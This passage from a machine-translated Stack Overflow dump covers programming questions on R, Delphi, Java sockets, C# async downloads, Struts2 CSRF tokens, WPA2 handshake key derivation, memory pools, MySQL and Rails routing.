                    (theta3 * independentB) - (theta1 * theta3 * independentA),
data = list(dependentB = data$dependent[2:48], dependentA = data$dependent[1:47],
   independentB = data$independent[2:48], independentA = data$independent[1:47]),
start = list(theta1 = -10, theta2 = -10, theta3 = -10)
) 
```

不幸的是，EViews 输出的估计值`nlsLM`并不接近 EViews 输出的估计值。你知道是什么原因造成的吗？或者也许我的代码错了？

最后，我想说我个人是一个 R 用户——这正是我尝试在 R 而不是 EViews 中执行此操作的原因。我也很乐意向您提供我正在使用的数据，但这是不可能的，因为它是机密数据。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2015-11-27T07:50:45.510

似乎 Eviews 规范应该是：

```
dep_var  c indep_var ar(1) 
```

# delphi - Delphi 厚客户端到 Web 应用程序

> ID：13353562
> 
> 赞同：1
> 
> 时间：2012-11-12T23:51:43.933
> 
> 标签：delphi, thick-client

我目前正在使用 Delphi 5 并计划将应用程序迁移到最新版本（XE3）或其他技术。迁移的主要目的是不想要胖客户端。在当前场景中，应用程序（exe）被下载到用户本地文件夹，然后在本地运行。主要目的是不想将应用程序下载到用户机器上。.

如果下载限制得到解决，想坚持使用 Delphi。有网络解决方案吗？或从公共点访问应用程序而不下载到用户机器的方式。

感谢您的帮助和建议。

注意：有很多用户使用这些应用程序。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-13T01:20:51.287

根据应用程序的类型，您可以围绕应用程序的核心功能添加 Web 层。

如果您创建类似 SOAP 或 REST 接口的东西，您可以使用任何适合的语言编写 Web 客户端。可能是 Delphi，或者更面向 Web 的语言，如 PHP 或 ASP.Net。通过拥有 Web 界面，您的用户可以从任何平台访问。

另一方面，如果您当前的应用程序没有正确分层，并且您在 GUI 和模型之间混合了很多代码，这可能会很困难。这将意味着重写大量代码，或者只是接受您的用户需要 Windows 和 .exe 文件的事实。

至少通过使用 Delphi，您的用户不需要下载需要管理员权限才能安装的庞大框架。

无论如何，你应该提供更多关于你已经拥有的信息，它是什么类型的应用程序，它有多复杂等等。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-13T06:40:49.730

如果您计划迁移到 Java Enterprise Edition (Java EE)，则可以使用两种通信模型，使用现有的商业和开源解决方案来访问现有的 Delphi 逻辑：

*   对于 Delphi 和 Java 之间的同步（请求/响应）式通信，有用于 Delphi 的轻量级 Web 框架（我最近写了[这个](http://www.habarisoft.com/habari_webcomponents.html)）和可用于数据交换的开源 JSON/XML 库。这允许 Java 应用程序服务器通过 HTTP 访问 Delphi 逻辑

*   对于异步通信，我为 Delphi 和 Free Pascal 编写了（商业）消息代理客户端[库](http://www.habarisoft.com/)，它们可以与 JBoss 和 GlassFish 应用程序服务器中的 Java 消息服务（JMS）服务器一起使用 - JBoss 和 GlassFish 已经包含一个消息解决方案（[HornetQ](http://www.hornetq.org/)和[Open MQ](http://mq.java.net/)），作为完整 Java EE 配置文件的必需部分

我还为 JBoss 和 GlassFish Delphi 集成编写了一些[分步教程：](https://mikejustin.fogbugz.com/default.asp?W13)

[Delphi 与 JBoss 应用服务器 5 的集成](http://mikejustin.wordpress.com/2010/03/30/tutorial-delphi-integration-with-jboss-application-server-5/)

[Delphi 与 GlassFish v3 应用服务器的集成第 1 部分 - 发送消息](https://mikejustin.fogbugz.com/default.asp?W11)

[Delphi 与 GlassFish v3 应用服务器的集成第 2 部分 - 接收消息](https://mikejustin.fogbugz.com/default.asp?W12)

# java - 抽象类或接口 Java

> ID：13353571
> 
> 赞同：-3
> 
> 时间：2012-11-12T23:53:06.320
> 
> 标签：java, interface, abstract

> **可能重复：**
> [接口还是抽象类？](https://stackoverflow.com/questions/1165332/interface-or-abstract-class)
> [java中的抽象和接口](https://stackoverflow.com/questions/8121682/abstract-and-interface-in-java)

我仍然是 Java 的学生，我遇到了抽象类和接口。

现在，当您创建一个抽象类时，您可以编写如下方法：

```
public abstract void something(); 
```

但是当您在界面中创建一个方法时，它看起来像这样：

```
public void something(); 
```

现在我不是盲目的，我可以看到有一些区别，我也知道你`extend`是一个抽象类，你`implement`是一个接口。

但是有人能告诉我有什么区别吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-12T23:57:57.693

“抽象”基本上意味着该方法没有实现。实现必须由子类提供。因此，不能创建具有抽象方法的类的实例。

现在 Java 中的接口只是方法签名的集合。它们不能包含设计的实现。因此，`abstract`关键字将是多余的。不能创建接口的实例，只能创建实现接口的具体类。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-12T23:55:09.173

这两个套路没有区别。区别在于`abstract`类可以包含用于所有实现的通用逻辑，而接口不能。

# visual-studio - Visual Studio 项目中的文件夹

> ID：13353575
> 
> 赞同：0
> 
> 时间：2012-11-12T23:53:14.557
> 
> 标签：visual-studio, directory

我可以在 Visual Studio 项目中随意使用任意文件夹层次结构吗？运行时/VS 是否真的关心我如何创建文件夹？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-13T00:14:34.153

Visual Studio 不关心您使用的文件夹结构。通常根据文件类型和项目（csproj、vbproj 等）文件中的引用将所有内容联系在一起。

也就是说：一般来说，最好遵守微软为公共文件制定的约定，因为人们习惯于在这些地方寻找它们。

# jquery - 如何在 Struts2 应用程序中为 AJAX 请求做 CSRF 保护

> ID：13353577
> 
> 赞同：2
> 
> 时间：2012-11-12T23:53:34.480
> 
> 标签：jquery, ajax, struts2, csrf, antiforgerytoken

我有一个 struts2 webapp，我需要在其中实现 CSRF 保护。对于统计表格，它非常简单。我只需要激活`tokenSession`拦截器然后`<s:token/>`在要提交的表单中设置。（解释[here](http://nickcoblentz.blogspot.com/2008/11/csrf-prevention-in-struts-2.html)和[here](http://web.securityinnovation.com/appsec-weekly/blog/bid/84318/Cross-Site-Request-Forgery-CSRF-Prevention-Using-Struts-2)）

但是，当我需要为不一定通过表单提交的 POST AJAX 调用（我使用的是 jQuery）启用 CSRF 保护时，就会出现问题。在进行后续 AJAX 调用时，我面临重用令牌的问题。

任何指针或不同的方法都值得赞赏。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-13T18:47:42.000

目前，我已经通过为 AJAX 请求生成令牌并使用正常响应发送它来解决问题，如下所示 -

```
 Map<String, String> tokenInfo = Maps.newHashMap();
    tokenInfo.put("struts.token.name", TokenHelper.getTokenName());
    tokenInfo.put(TokenHelper.getTokenName(), TokenHelper.setToken()); 
```

我将从这个中抽象出一个 util 方法，并让被令牌激活的操作返回这个作为响应的一部分，这些操作将在不刷新页面的情况下重复执行。

不过，我仍在寻找一个优雅的解决方案。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-13T09:43:40.980

您不能生成一个 Token 并将其用作 ajax 调用中的参数吗？

对于后续的 AJAX 调用，您可以使用`per-user Token`,

不一定是`per-request Token`,

正如这个 SO 答案中所解释的：[我需要一个用于 jQuery .ajax() 的 CSRF 令牌吗？](https://stackoverflow.com/questions/9089909/do-i-need-a-csrf-token-for-jquery-ajax)

# java - 从套接字读取时如何检测客户端何时完成发送请求？

> ID：13353592
> 
> 赞同：3
> 
> 时间：2012-11-12T23:54:53.817
> 
> 标签：java, sockets, httprequest, httpserver

我现在正在编写一个 http 服务器，但从套接字读取时遇到问题。我的问题是`inputStream`来自客户端的消息永远不会结束，它会一直读取直到客户端关闭。我知道客户端在发送 http 请求后并没有立即关闭与服务器的连接。`while loop`当客户端发送所有请求数据（即标头+正文）时， 如何退出。

```
while (in.hasNextLine()) {
    String line = in.nextLine();

    if (line.equals("")){ // last line of request header is blank
        break; // quit while loop when last line of header is reached
    } else {
        request = request + line + "\n";
    }
} 
```

在阅读了你们的评论和回答后，这就是我想出的，

```
 is = incoming.getInputStream();
            os = incoming.getOutputStream();
            in = new Scanner(is);
            out = new DataOutputStream(os);

            RequestHandler rh = new RequestHandler();
            int length = 0;
            while (in.hasNextLine()) {
                String line = in.nextLine();
                if (line.equals("")) { // last line of request message
                                        // header is a
                                        // blank line
                    break; // quit while loop when last line of header is
                            // reached
                }

                if (line.startsWith("Content-Length: ")) { // get the
                                                            // content-length
                    int index = line.indexOf(':') + 1;
                    String len = line.substring(index).trim();
                    length = Integer.parseInt(len);
                }

                request = request + line + "\n";
            }

             byte[] body = new byte[length];
             int i = 0;
             while (i < length) {
             byte b = in.nextByte();
             body[i] = b;
             i++;
             } 
```

但是，我仍然不明白按字节读取。我可以编写我的代码来读取直到-1，但是当没有 EOF 并且客户端没有关闭连接时仍然卡住。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-13T02:09:18.877

There are 3 ways of detecting the end of the stream depending on what requests you are handling:

1.  If it is a `GET` or `HEAD` request, you only need to read the HTTP headers, request body is normally ignored if it exists, so when you encounter `\r\n\r\n`, you reach the end of the request(actually the request headers).
2.  If it is a `POST` method, read the `Content-Length` in the header and read up to `Content-Length` bytes.
3.  If it is a `POST` method and the `Content-Length` header is absent, which is most likely to happen, read until `-1` is returned, which is the signal of `EOF`.

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-11-13T16:37:47.163

I've got it :) Thank you guys for comments and answers...

```
 is = incoming.getInputStream(); // initiating inputStream
            os = incoming.getOutputStream(); // initiating outputStream

            in = new BufferedReader(new InputStreamReader(is)); // initiating
                                                                // bufferReader
            out = new DataOutputStream(os); // initiating DataOutputSteream

            RequestHandler rh = new RequestHandler(); // create a
                                                        // requestHandler
                                                        // object

            String line;
            while ((line = in.readLine()) != null) {
                if (line.equals("")) { // last line of request message
                                        // header is a
                                        // blank line (\r\n\r\n)
                    break; // quit while loop when last line of header is
                            // reached
                }

                // checking line if it has information about Content-Length
                // weather it has message body or not
                if (line.startsWith("Content-Length: ")) { // get the
                                                            // content-length
                    int index = line.indexOf(':') + 1;
                    String len = line.substring(index).trim();
                    length = Integer.parseInt(len);
                }

                request.append(line + "\n"); // append the request
            } // end of while to read headers

            // if there is Message body, go in to this loop
            if (length > 0) {
                int read;
                while ((read = in.read()) != -1) {
                    body.append((char) read);
                    if (body.length() == length)
                        break;
                }
            }

            request.append(body); // adding the body to request 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2020-11-18T22:36:55.360

I want to share my code that works great:

```
private static String getClientRequest(Socket client) throws IOException, SocketException {
    System.out.println("Debug: got new client " + client.toString());
    BufferedReader br = new BufferedReader(new InputStreamReader(client.getInputStream(), "UTF-8"));

    StringBuilder requestBuilder = new StringBuilder();
    String line;
    int contectLegnth = 0;

    while (!(line = br.readLine()).isBlank()) {
        requestBuilder.append(line + "\r\n");
        if (line.toLowerCase().startsWith("content-length")) {
            contectLegnth = Integer.parseInt(line.split(":")[1].trim());
        }
    }

    StringBuilder requestBodyBuilder = new StringBuilder();
    if (contectLegnth > 0) {
        int read;
        while ((read = br.read()) != -1) {
            requestBodyBuilder.append((char) read);
            if (requestBodyBuilder.length() == contectLegnth)
                break;
        }
        requestBuilder.append("\r\n" + requestBodyBuilder);
    }

    return requestBuilder.toString();
} 
```

# android - 2 Android OpenGL GLSurfaceView 活动之间的平滑过渡

> ID：13353594
> 
> 赞同：2
> 
> 时间：2012-11-12T23:54:59.527
> 
> 标签：android, opengl-es, android-activity, glsurfaceview

我有 2 `Activitiy`s`OpenGL`用于绘图。在从一个活动过渡到下一个活动时，我得到一个难看的空屏幕，上面充满了我的`OpenGL`清晰颜色（所以它不像黑屏那么糟糕）。

我希望在`Activity`s 之间有效地无缝过渡，但是在创建 a 时有几个高负载区域`GLSurfaceView`。主要问题是纹理加载，因为这是最慢的。

无论如何在`Activity`s 之间加倍缓冲，以便最后一个`Activity`视图被冻结，直到我明确告诉我的下一个`Activity`绘制？我希望过渡是无缝的？

将所有内容移到一个`GLSurfaceView`实例中并不是我真正想要考虑的选择。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-20T01:32:06.053

由于它的 OpenGL ES，在 Android 2.x 中很难做到这一点。此外，如果您在连续渲染中，不建议您在一个应用程序中使用两个 OpenGL。如果是这样，要轻松控制它们，您将需要 RENDERMODE_WHEN_DIRTY。

如果您在 Android 4.x 中使用它，TextureView 是可选的。

TextureView 与 GLSurfaceView 相同，但与 View 兼容，这意味着您可以将 ViewAnimation 用于 TextureView。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-13T19:01:03.090

您可以`setRenderMode( RENDERMODE_WHEN_DIRTY)`在 GLSurfaceView 中使用，因此只有在您调用`requestRender()`.
这样，您在调用另一个表面视图之前绘制的任何内容都只会在您请求新的绘制时被清除。
您可以通过将渲染模式设置为`RENDERMODE_CONTINUOUSLY`.

# syntax - 哪些语言没有为语句定义多语句的执行顺序？

> ID：13353598
> 
> 赞同：1
> 
> 时间：2012-11-12T23:55:12.163
> 
> 标签：syntax, for-loop

一些类 C 语言允许在语句的更新部分使用多个`for`语句，例如

```
for (int i = 0; i < limit; i++, butter--, syrup--, pancakesDevoured++) 
```

Java 在 ECMA-334 (C#) 的[JLS 14.14.1.2](http://docs.oracle.com/javase/specs/jls/se7/html/jls-14.html#jls-14.14.1.2)和 15.8.3 中明确定义了此类语句的顺序，说“for-iterator 的表达式（如果有的话）按顺序计算”，我将其解读为 left-向右。

哪些语言（如果有）允许在循环的更新部分中使用多个语句，`for`但要么不为此类语句定义顺序，要么使用从左到右以外的顺序？

编辑：删除了`C`标签，因为这开始了一个序列点讨论，[而且已经](https://stackoverflow.com/questions/4638364/undefined-behavior-and-sequence-points-reloaded)[有](https://stackoverflow.com/questions/4176328/undefined-behavior-and-sequence-points) [很多](http://en.wikipedia.org/wiki/Sequence_point) 了。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-13T00:12:35.250

Technically, that's a single expression, not one or more statements, though the distinction isn't super important.

Good old C makes only limited promises about what order expressions like this will be evaluated in. In your example, the order doesn't matter. But consider this expression:

```
a[i++] = i 
```

If `i` was 1 before evaluating this expression, should `a[1]` now equal 1 or 2? As I understand the C specification, the behavior of this expression is undefined, meaning that what you get depends on which compiler you use.

* * *

Thanks to @mizo for a readable reference on [sequence points](http://en.wikipedia.org/wiki/Sequence_point), and to @ChrisDodd for pointing out that if you're making simple independent assignments that are separated by the comma operator, C and C++ do fully specify a left-to-right evaluation order.

# java - 写入 File.txt Java 的迭代器

> ID：13353608
> 
> 赞同：1
> 
> 时间：2012-11-12T23:57:00.253
> 
> 标签：java

这是我的问题：我需要将 Interator 写入文件“random.txt”我能够看到所有数据。数据存储在假设的位置，我可以使用 System.out.print 看到它，但我的文件是空白的。我能够创建文件但不能写入它。

我正在从我的 comp 中读取一个文件。存储在 Treemap 中并尝试写入文本文件。（我可以毫无问题地使用 Array）但是这个带有 Iterator 的 Map 让我头晕目眩。

如果有人可以帮助我一窝，我将不胜感激。

我需要使用 TreeMap 和迭代器。

```
public static void main(String[] args) throws FileNotFoundException, IOException {
    Map<String, String> Store = new TreeMap<>();

    Scanner text=new Scanner(System.in);

    System.out.println("enter file:  ");

    //C:\Users\Alex\Desktop\Fruits\fruits.txt           

    String rap=text.next();

    File into = new File(rap);

    try (Scanner in = new Scanner(into)) {                

        while (in.hasNext()){
            String name=in.next();
            String fruta = in.next();
            Integer num= Integer.parseInt(in.next());
            System.out.println(fruta+"\t"+name+"\t"+num);

            if (Store.containsKey(fruta)){
                Store.put(name,Store.get(name)+fruta );
            }
            else{
                Store.put(name,fruta);
            }
        }

        in.close();

    }                                                                

    System.out.println();

    // insert data to store MAP 
    Set top=Store.entrySet();
    Iterator it = top.iterator();  

    // debugging 

    System.out.println(top);

    // Creating file???????
    FileWriter fstream = new FileWriter("random.txt");  

    //identify File to be write?????? 
    BufferedWriter out = new BufferedWriter(fstream);

    //iterator Loop       
    while(it.hasNext()) {

        Map.Entry m = (Map.Entry)it.next();
        String key = (String)m.getKey();
        String value = (String)m.getValue();

        //writing to file?????
        out.write("\t "+key+"\t "+value);

        // debugging 
        System.out.println(key +"\t"+ value);
    }       

    System.out.println("File created successfully.");
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-13T00:00:23.507

`while`循环（写入文件的循环）完成后，执行以下操作：

```
out.flush();
out.close(); 
```

**简短的解释：** `BufferedWriter`在内存中缓冲你写的东西。`write`当您调用该方法时，它不会立即写入文件。一旦 while 循环完成并且要写入文件的数据在缓冲内存中准备好，您应该调用`flush`以执行*实际*写入硬盘的操作。最后，您应该始终`close`使用不再使用的 BufferedWriter，以避免内存泄漏。

# c# - 真实世界的异步和等待代码示例

> ID：13353610
> 
> 赞同：3
> 
> 时间：2012-11-12T23:57:24.663
> 
> 标签：c#, async-await

我一直在到处寻找 .net 4.5 中新的 Async 和 Await 功能的真实世界示例。我想出了以下代码来下载文件列表并限制并发下载的数量。我将不胜感激任何改进/优化此代码的最佳实践或方法。

我们使用以下语句调用以下代码。

```
await this.asyncDownloadManager.DownloadFiles(this.applicationShellViewModel.StartupAudioFiles, this.applicationShellViewModel.SecurityCookie, securityCookieDomain).ConfigureAwait(false); 
```

然后，我们使用事件将下载的文件添加到 ViewModel 上的 observablecollection（.net 4.5 中的新线程安全版本）。

```
public class AsyncDownloadManager
    {
        public event EventHandler<DownloadedEventArgs> FileDownloaded;

        public async Task DownloadFiles(string[] fileIds, string securityCookieString, string securityCookieDomain)
          {
            List<Task> allTasks = new List<Task>();
            //Limits Concurrent Downloads 
            SemaphoreSlim throttler = new SemaphoreSlim(initialCount: Properties.Settings.Default.maxConcurrentDownloads);

            var urls = CreateUrls(fileIds);

            foreach (var url in urls)   
            {  
                await throttler.WaitAsync();
                allTasks.Add(Task.Run(async () => 
                {
                    try
                    {
                        HttpClientHandler httpClientHandler = new HttpClientHandler();
                        if (!string.IsNullOrEmpty(securityCookieString))
                        {
                            Cookie securityCookie;
                            securityCookie = new Cookie(FormsAuthentication.FormsCookieName, securityCookieString);
                            securityCookie.Domain = securityCookieDomain;
                            httpClientHandler.CookieContainer.Add(securityCookie);    
                        }                     

                        await DownloadFile(url, httpClientHandler).ConfigureAwait(false);
                    }
                    finally
                    {
                        throttler.Release();
                    }
                }));
            }
            await Task.WhenAll(allTasks).ConfigureAwait(false);
        }

        async Task DownloadFile(string url, HttpClientHandler clientHandler)
        {
            HttpClient client = new HttpClient(clientHandler);
            DownloadedFile downloadedFile = new DownloadedFile();

            try
            {
                HttpResponseMessage responseMessage = await client.GetAsync(url).ConfigureAwait(false);
                var byteArray = await responseMessage.Content.ReadAsByteArrayAsync().ConfigureAwait(false);

                if (responseMessage.Content.Headers.ContentDisposition != null)
                {
                    downloadedFile.FileName = Path.Combine(Properties.Settings.Default.workingDirectory, responseMessage.Content.Headers.ContentDisposition.FileName);
                }
                else
                {
                    return;
                }

                if (!Directory.Exists(Properties.Settings.Default.workingDirectory))   
                {
                    Directory.CreateDirectory(Properties.Settings.Default.workingDirectory);
                }
                using (FileStream filestream = new FileStream(downloadedFile.FileName, FileMode.Create, FileAccess.Write, FileShare.None, bufferSize: 4096, useAsync: true))
                {
                    await filestream.WriteAsync(byteArray, 0, byteArray.Length);
                }
            }
            catch(Exception ex)
            {    
                return; 
            }
            OnFileDownloaded(downloadedFile);
        }

        private void OnFileDownloaded(DownloadedFile downloadedFile)
        {    
            if (this.FileDownloaded != null)
            {
                this.FileDownloaded(this, new DownloadedEventArgs(downloadedFile));
            }
        }    

    public class DownloadedEventArgs : EventArgs
    {
        public DownloadedEventArgs(DownloadedFile downloadedFile)
        {   
            DownloadedFile = downloadedFile;
        }

        public DownloadedFile DownloadedFile { get; set; }
    } 
```

根据 Svick 的建议 - 以下是直接问题：

1.  在其他 Async / Await 方法中嵌入 Async / Await 有什么影响？（在 Async / Await 方法中将文件流写入磁盘。
2.  应该为每个单独的任务使用 httpclient 还是应该共享一个？
3.  事件是将下载的文件引用“发送”到视图模型的好方法吗？[我也会在codereview中发帖]

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-13T14:01:42.437

如果您嵌入异步等待，您应该使用

```
Task.ConfigureAwait(false) 
```

在任何返回 Task 的东西上，否则任务将在调用者的线程上下文中继续，除了 UI 线程之外，这是不必要的。总之，库应该使用 ConfigureAwait(false) 而 UI 代码不应该。就是这样！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-13T21:14:58.150

我认为您的问题与您的代码没有直接关系，因此我将在这里回答：

> 在其他 Async/Await 方法中嵌入 Async/Await 有什么效果？（在 Async / Await 方法中将文件流写入磁盘。）

`async`方法旨在像这样组合。实际上，这是唯一的`async`-`await`可用于：组合异步方法以创建另一个异步方法。

`await`发生的情况是，如果您`Task`尚未完成，您的方法实际上会返回给调用者。然后，当`Task`完成时，您的方法会在原始上下文中恢复（例如 UI 应用程序中的 UI 线程）。

如果您不想继续使用原始上下文（因为您不需要它），您可以使用 更改它`ConfigureAwait(false)`，就像您已经做的那样。无需在内部执行此操作`Task.Run()`，因为该代码不在原始上下文中运行。

> 应该为每个单独的任务使用 httpclient 还是应该共享一个？

的文档`HttpClient`说它的实例方法不是线程安全的，所以你应该为每个`Task`.

> 事件是将下载的文件引用“发送”到视图模型的好方法吗？

我认为 events 不能很好地与`async`-结合在一起`await`。在您的情况下，它只有在您使用[`BindingOperations.EnableCollectionSynchronization`](http://msdn.microsoft.com/en-us/library/hh198845.aspx)并且也在您自己的代码中正确锁定集合时才有效。

我认为更好的选择是使用 TPL Dataflow 或 Rx 之类的东西。

# security - WPA2 - EAPOL 密码交换

> ID：13353614
> 
> 赞同：2
> 
> 时间：2012-11-12T23:58:03.933
> 
> 标签：security, networking, protocols, wireless

（我在我的网络上这样做，只是为了科学）。我正在使用 airodump-ng 来捕获握手。之后，我能够在 WireShark 中打开包含捕获信息的文件，并找到包含 EAPOL 协议的 4 条握手消息的部分。我知道蛮力需要数百万年的时间，而且我知道我可以使用 aircrack-ng 进行字典攻击。

我想从这 4 条消息中提取密码。我假设它是作为某种加盐哈希值传输的。我不知道的是，消息密码驻留在哪个消息中（无线密码，用于连接）以及究竟是如何发送的？例如“密码”+“ssid”的 SHA1...我希望能够在我的程序中计算完全相同的哈希（当然，这仅适用于我的网络，因为我知道我的密码）。我也需要它来进行大学演示。

谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2014-02-04T13:17:07.997

您捕获的 802.11i“4 次握手”是双方就共享组（读取：广播）和成对（读取：单播）临时密钥达成一致的地方。即此处生成的密钥仅在 802.11 关联期间存在，或者直到从 AP 发出下一个更新密钥。

在您开始解密 4 次握手消息之前，您需要成对主密钥 (PMK)，它是使用密钥派生函数 (PBKDF2) 从用户输入的密码中派生出来的，或者是 WPS 交换的结果它基于 Diffie-Helman。

此处的要点是，您要提取的 ASCII 密码不会在 4 条消息中的任何一条中交换，因为它*已经*在参与交易的所有各方（在本例中为客户端和 AP）之间共享并用于生成 256 位PMK。除非你有这个 PMK，否则 4 次握手消息的内容和随机数据一样好。

如果您已经知道 PMK，您可以做的最好的事情是从 4 次握手的 M2 和 M3 中提取 GTK 和 PTK，并从中提取可以与后续帧中的有效负载进行异或的时间密钥以获得明文数据 - 如果您在 IEE802.11 设置中输入 PMK 或密码并启用解密，wireshark 也会为您执行此操作。

# c - 增长（和缩小）内存池

> ID：13353615
> 
> 赞同：2
> 
> 时间：2012-11-12T23:58:08.447
> 
> 标签：c, memory-management, memory-pool

假设，出于问题的目的，我们有一个内存池，最初分配了*n个块。*但是，当达到容量时，池想要增长并变成原来的两倍（*2n*）。

现在这个调整大小操作可以`realloc`在 C 中完成，但是函数本身可能会返回一个指向不同内存的指针（其中复制了旧数据）。

这意味着内存池分配器返回的指针可能不再有效（因为内存*可能已*被移动）。

什么是克服这个问题的好方法？或者甚至有可能吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-13T00:06:55.060

从多个不连续的内存池中分配。当一个池已满时，分配第二个池，使其位于您的虚拟地址空间中的其他位置。

然后问题是跟踪您的池在哪里。通常，您会使用每个池中的一些空间进行簿记。例如，您可以保留一个指针的空间来保存所有池的简单线性链表。更复杂的分配器往往需要更多的簿记开销。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-13T00:07:31.990

不是使用 realloc，而是 malloc 一个新的/额外的块块（假设没有理由为什么由池分配器管理、返回和返回的块需要位于单个连续的内存块中）。

# android - 同一类（共享数据）

> ID：13353619
> 
> 赞同：0
> 
> 时间：2012-11-12T23:58:24.353
> 
> 标签：android, textview

我创建了一个 AlertDialog（编辑文本），但后来我想将插入的值放入一个数组中：

```
void goToPage(){

    AlertDialog.Builder alert = new AlertDialog.Builder(this);
    alert.setTitle("Title");
    alert.setMessage("Message");
    final EditText input = new EditText(this);
    alert.setView(input);
    alert.setPositiveButton("Ok", new DialogInterface.OnClickListener() {
    public void onClick(DialogInterface dialog, int whichButton) {
        String value = input.getText().toString();
        int value2 = Integer.parseInt(value);
    // Do something with value!
    }
    });
    alert.setNegativeButton("Cancel", new DialogInterface.OnClickListener() {
    public void onClick(DialogInterface dialog, int whichButton) {
    // Canceled.
    }
    });
    alert.show();           
} 
```

在同一个类中，我有这个数组：

```
array[20] 
```

在同一个班级，我不能使用 value2 因为没有共享。

如何将方法内的数据共享给整个类？

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-13T00:03:49.700

您可以通过将数据传递给全局范围的变量来将数据从方法共享到整个类。所以：

```
public class MyClass {
int num; //now this is global

//....everything else

} 
```

确保您了解作用域在 Java 中的工作原理。当您在方法和循环中时，范围会发生变化。但是全局变量总是可以从类中的任何地方访问。在这样的情况下，这条规则的例外会变得很奇怪：

```
public class MyClass {
int num; //now this is global

    public MyClass(){
        num = 1;
    }
    public void access(int num) {
        num = 5;
    }
    public void printOut() {
        System.out.println(num);
    }

} 
```

运行它：

```
MyClass something = new MyClass();
something.access(8);
something.printOut(); 
```

int 的值仍然是`1`因为另一个实例（在 access() 中）`num`是本地的，这意味着全局`num`不知道它的存在。它们不一样。这就是`this`关键字的用途。但我不会参与其中。你绝对可以做研究:)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-13T02:00:24.410

你可以在“onClick”函数中使用数组[20]

# ruby-on-rails-3 - 在验证中访问参数

> ID：13353623
> 
> 赞同：0
> 
> 时间：2012-11-12T23:59:00.470
> 
> 标签：ruby-on-rails-3

我想在验证失败导致的错误消息中显示一些额外信息。例如，假设我有一个具有以下验证的类 Book

```
validates :name, presence: true, uniqueness: true 
```

当有人尝试插入同名书籍时，将返回以下错误消息

```
{"name":["has already been taken"]} 
```

相反，我想展示

```
{"name":["Book 'Great Expectaions' has already been taken at id:7"]} 
```

现在要做到这一点，我必须删除我上面提到的唯一性验证并执行以下操作

```
validate do |book|
  existing_book = Book.find_by_name(book.name)
  if existing_book
    book.errors.add(:name, "#{existing_book.name} already exists at id: #{existing_book.id}")
  end
end 
```

有没有办法在不编写自定义唯一性验证的情况下获取上述自定义错误消息？我在想一些事情

```
validates :name, presence: true, uniqueness: {message: "#{self.name} already exists at id: #{Book.find_by_name(self.name).id}" 
```

但这似乎不起作用，因为 self.name 返回“书”。有没有办法在这种情况下访问传递的参数？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-13T00:10:37.380

您必须将此作为自定义验证。我会这样做：

```
validate :name_is_unique

private
def name_is_unique
  errors.add(:name, "#{other_book.name} already exists at id: #{other_book.id}") if other_book = Book.find_by_name(name)
end 
```

问题并不在于您不能在验证中包含当前模型属性，而是没有“单线”方式来包含另一个模型。好消息是，这就是该`validate`方法的用途。

如果在模型中使用它让您感到困扰，只需编写一个[自定义验证器](http://guides.rubyonrails.org/active_record_validations_callbacks.html#custom-validators)，以便它可以在应用程序范围内重复使用。

# mysql - MYSQL 计数 - 如果为 null，则返回 0

> ID：13353624
> 
> 赞同：0
> 
> 时间：2012-11-12T23:59:09.607
> 
> 标签：mysql, sql, null

这是我的查询：

```
select COUNT(*) as total, COUNT(distinct user) as unique 
FROM table 
WHERE uristem in ('/example/', '/example/', '/example/', '/example/') 
      and time > DATE_SUB(NOW(), INTERVAL 24 HOUR)' 
group by uristem; 
```

应该看起来像这样

```
100 50
25  50
0   0
100 35 
```

但是如果没有计数，它看起来像这样（缺失）

```
100 50
40  50
100 35 
```

我怎样才能填写 0 呢？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-13T00:05:43.493

如果你没有一张带有 uri 词根的桌子，那么一些丑陋的东西就像

```
Select
  u.uristem,
  count(t.uristem),
  count(distinct t.user) as unique
From (
    Select '/example1/' As uristem
    Union All Select '/example2/'
    Union All Select '/example3/'
    Union All Select '/example4/'
  ) u
    Left Outer Join
  table t
    On u.uristem = t.uristem And
    t.time > Date_Sub(Now(), Interval 24 Hour)
 Group By
   u.uristem 
```

应该这样做

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-13T00:05:46.827

试试这个（未经测试）：

```
select COUNT(t.uristem) as total
, COUNT(distinct t.user) as unique 
FROM 
    (
        select uristem, user
        from table
        where time > DATE_SUB(NOW(), INTERVAL 24 HOUR) 
    ) t
right outer join 
(
    select '/example/' x
    union select '/example/'
    union select '/example/'
    union select '/example/'
) y
on t.uristem = y.x
group by y.x; 
```

# ruby-on-rails - 没有路线匹配“#new”的“#show”

> ID：13353626
> 
> 赞同：1
> 
> 时间：2012-11-12T23:59:17.050
> 
> 标签：ruby-on-rails, rails-routing

我遇到了一个奇怪的路由问题，我不确定如何解决。

我有一条看起来像...的路线

```
new_tenants_venue GET  /tenants/venues/new(.:format)  tenants/venues#new 
```

但是当我到达那条路线“/tenants/venues/new”时，我得到了错误......

```
No route matches {:action=>"show", :controller=>"tenants/venues", ... 
```

我在列表中看不到任何会干扰的类似路线，尤其是在那条路线之前。之后是 #show 路线，但它有一个 :id 而不是“新”

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-13T05:18:27.777

